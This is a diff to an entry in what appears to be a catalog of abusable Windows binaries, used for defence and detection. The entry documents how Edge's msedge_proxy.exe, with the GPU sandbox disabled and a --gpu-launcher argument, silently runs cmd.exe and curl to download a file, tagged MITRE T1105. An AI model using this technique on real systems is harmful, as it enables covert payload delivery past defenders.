@@ -11,7 +11,7 @@ Commands:
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10, Windows 11
-  - Command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c curl http://example.com:8001/test.txt --output C:\Users\User\Desktop\test.txt &&"
+  - Command: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe" --disable-gpu-sandbox --gpu-launcher="c:\Windows\System32\cmd.exe /c curl ipinfo.io/json --output %USERPROFILE%\Desktop\test.json &&"
     Description: Edge will silently download the file.
     Usecase: Download file from the internet
     Category: Download
